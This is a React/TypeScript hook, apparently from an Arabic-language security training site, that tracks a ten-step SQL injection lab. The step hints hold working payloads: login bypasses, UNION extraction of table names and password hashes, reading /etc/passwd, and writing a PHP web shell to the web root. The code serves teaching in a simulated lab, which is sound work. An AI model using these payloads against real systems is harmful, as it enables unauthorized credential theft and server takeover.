import { useState, useCallback } from 'react'
import { useProgress } from '../../context/ProgressContext'

export interface MissionStep {
    id: number
    tool: 'terminal' | 'zoogle' | 'linkedin' | 'quiz' | 'login'
    title: string
    objective: string
    hint: string
    quipAr: string
    completed: boolean
}

const STORAGE_KEY = 'cybermasry_lab04_progress'

const INITIAL_STEPS: MissionStep[] = [
    {
        id: 1,
        tool: 'terminal',
        title: 'Test for SQLi (Error-Based)',
        objective: 'Enter a single quote in the username field to trigger a SQL error and confirm the vulnerability.',
        hint: "' (single quote in the username field)",
        quipAr: 'فلتة صغيرة في الكود بتكسر الـ SQL query — جرب \' في خانة الاسم 🎯',
        completed: false,
    },
    {
        id: 2,
        tool: 'terminal',
        title: 'Classic Auth Bypass',
        objective: "Use the classic SQL injection: ' OR '1'='1 to bypass login without a password.",
        hint: "' OR '1'='1",
        quipAr: 'أشهر SQLi في التاريخ — OR 1=1 بتخلي الشرط دايماً صح 😈',
        completed: false,
    },
    {
        id: 3,
        tool: 'terminal',
        title: 'Comment-Based Bypass',
        objective: "Use comment syntax to cut off the rest of the SQL query: admin'--",
        hint: "admin'--",
        quipAr: '-- في SQL يعني "تجاهل باقي السطر" — بتعمل inject وبتشيل الباقي 💬',
        completed: false,
    },
    {
        id: 4,
        tool: 'terminal',
        title: 'Find Number of Columns',
        objective: 'Use ORDER BY to determine how many columns are in the result set.',
        hint: "' ORDER BY 3--",
        quipAr: 'عشان تعمل UNION attack صح، لازم تعرف عدد الأعمدة الأول 🔢',
        completed: false,
    },
    {
        id: 5,
        tool: 'terminal',
        title: 'UNION-Based Data Extraction',
        objective: 'Use UNION SELECT to inject your own query and extract database version.',
        hint: "' UNION SELECT 1,version(),3--",
        quipAr: 'UNION SELECT بيخليك تضيف query تانية جنب الأصلية وتجيب بيانات تانية 🗄️',
        completed: false,
    },
    {
        id: 6,
        tool: 'terminal',
        title: 'Extract Table Names',
        objective: "Query information_schema to list all tables in the database.",
        hint: "' UNION SELECT 1,table_name,3 FROM information_schema.tables--",
        quipAr: 'information_schema ده دليل شامل لكل حاجة في الـ database 📚',
        completed: false,
    },
    {
        id: 7,
        tool: 'terminal',
        title: 'Dump User Credentials',
        objective: 'Extract all usernames and password hashes from the users table.',
        hint: "' UNION SELECT 1,concat(username,':',password),3 FROM users--",
        quipAr: 'جمعنا username وpassword مع بعض بـ concat — كل الحسابات في يدنا 😈',
        completed: false,
    },
    {
        id: 8,
        tool: 'terminal',
        title: 'Identify Hash Type',
        objective: 'The passwords are hashed — identify the hash type by length and format.',
        hint: "' UNION SELECT 1,length(password),3 FROM users LIMIT 1--",
        quipAr: '32 حرف = MD5. 64 حرف = SHA256. بعد ما تعرف النوع، تقدر تعمل crack 🔓',
        completed: false,
    },
    {
        id: 9,
        tool: 'terminal',
        title: 'Read Local Files (Advanced)',
        objective: 'Use LOAD_FILE to read the server config file if MySQL has FILE privilege.',
        hint: "' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--",
        quipAr: 'لو MySQL شغال بـ root privilege، تقدر تقرأ أي ملف على السيرفر 😱',
        completed: false,
    },
    {
        id: 10,
        tool: 'terminal',
        title: 'Write a Web Shell',
        objective: 'Use INTO OUTFILE to write a PHP backdoor to the web root.',
        hint: "' UNION SELECT 1,'<?php system($_GET[cmd]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--",
        quipAr: 'SQLi → RCE! بتكتب PHP shell للـ web root وبتتحكم في كل السيرفر 💀',
        completed: false,
    },
]

function loadProgress(): MissionStep[] {
    try {
        const raw = localStorage.getItem(STORAGE_KEY)
        if (!raw) return INITIAL_STEPS
        const completedIds: number[] = JSON.parse(raw)
        return INITIAL_STEPS.map((s) => ({ ...s, completed: completedIds.includes(s.id) }))
    } catch {
        return INITIAL_STEPS
    }
}

function saveProgress(steps: MissionStep[]) {
    const completedIds = steps.filter((s) => s.completed).map((s) => s.id)
    localStorage.setItem(STORAGE_KEY, JSON.stringify(completedIds))
}

export function useMissionProgress() {
    const { saveStep } = useProgress()
    const [steps, setSteps] = useState<MissionStep[]>(loadProgress)

    const currentStepId = steps.find((s) => !s.completed)?.id ?? null
    const allComplete = steps.every((s) => s.completed)
    const completedCount = steps.filter((s) => s.completed).length

    const completeStep = useCallback((stepId: number) => {
        setSteps((prev) => {
            const next = prev.map((s) => (s.id === stepId && !s.completed ? { ...s, completed: true } : s))
            if (next !== prev) {
                saveProgress(next)
                saveStep(4, stepId)
            }
            return next
        })
    }, [])

    const resetProgress = useCallback(() => {
        localStorage.removeItem(STORAGE_KEY)
        setSteps(INITIAL_STEPS)
    }, [])

    return { steps, currentStepId, allComplete, completedCount, completeStep, resetProgress }
}

export function getLabProgress() {
    try {
        const raw = localStorage.getItem(STORAGE_KEY)
        const completedIds: number[] = raw ? JSON.parse(raw) : []
        return { completedCount: completedIds.length, totalSteps: INITIAL_STEPS.length, pct: Math.round((completedIds.length / INITIAL_STEPS.length) * 100) }
    } catch {
        return { completedCount: 0, totalSteps: INITIAL_STEPS.length, pct: 0 }
    }
}
